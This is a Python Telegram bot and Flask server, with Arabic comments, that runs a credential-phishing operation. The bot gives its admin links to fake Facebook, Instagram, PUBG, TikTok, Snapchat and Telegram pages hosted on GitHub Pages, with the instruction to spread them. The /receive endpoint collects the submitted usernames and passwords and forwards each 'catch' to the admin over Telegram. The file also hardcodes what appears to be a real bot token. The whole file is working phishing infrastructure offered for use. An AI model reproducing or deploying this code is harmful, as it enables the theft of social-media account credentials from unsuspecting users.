import telebot
from flask import Flask, request
import os

# --- إعدادات الجنرال ---
TOKEN = '7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM'
ADMIN_ID = '6829017835'
# رابطك الحديدي على GitHub Pages (تأكد أن هذا هو اسم مستخدم GitHub الخاص بك)
BASE_URL = 'https://a77094048-art.github.io/Html'

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- لوحة تحكم البوت ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    # التأكد أن الجنرال فقط هو من يتحكم بالبوت
    if str(message.chat.id) == ADMIN_ID:
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        
        # أزرار الروابط الحديدية (تفتح مباشرة)
        btn1 = telebot.types.InlineKeyboardButton("🔵 فيسبوك", url=f"{BASE_URL}/fb_orig.html")
        btn2 = telebot.types.InlineKeyboardButton("📸 إنستغرام", url=f"{BASE_URL}/ig_gift.html")
        btn3 = telebot.types.InlineKeyboardButton("🎮 ببجي UC", url=f"{BASE_URL}/pubg_uc.html")
        btn4 = telebot.types.InlineKeyboardButton("🎵 تيك توك", url=f"{BASE_URL}/tk_coins.html")
        btn5 = telebot.types.InlineKeyboardButton("👻 سناب شات", url=f"{BASE_URL}/snap_gift.html")
        btn6 = telebot.types.InlineKeyboardButton("🔹 تلغرام", url=f"{BASE_URL}/tg_prem.html")
        
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
        
        welcome_msg = (
            "🫡 **أهلاً بك يا جنرال في غرفة العمليات**\n\n"
            "تم تحديث الروابط الحديدية (GitHub Pages).\n"
            "هذه الروابط لا تنام ولا تتوقف، انشرها الآن:"
        )
        bot.reply_to(message, welcome_msg, reply_markup=markup, parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ عذراً، هذا البوت خاص بالجنرال فقط.")

# --- استقبال الصيد (في حال استخدمت السيرفر كواسطة) ---
@app.route('/receive', methods=['POST'])
def receive():
    try:
        data = request.json
        platform = data.get('platform', 'Unknown')
        user = data.get('u', 'N/A')
        password = data.get('p', 'N/A')
        
        text = (
            "🔱 **صيد جديد وصل للتو!** 🔱\n\n"
            f"📱 **المنصة:** {platform}\n"
            f"👤 **اليوزر:** `{user}`\n"
            f"🔑 **الباسورد:** `{password}`\n\n"
            "🎖️ الميدان للجنرال!"
        )
        bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
        return "SUCCESS", 200
    except Exception as e:
        print(f"Error: {e}")
        return "ERROR", 400

# --- مسار فحص الحياة (للحماية من النوم) ---
@app.route('/')
def home():
    return "<h1>General Base is Active 🎖️</h1>", 200

# --- تشغيل القاعدة ---
if __name__ == "__main__":
    import threading
    # تشغيل البوت في الخلفية
    threading.Thread(target=bot.polling, daemon=True).start()
    # تشغيل سيرفر ويب (Flask)
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
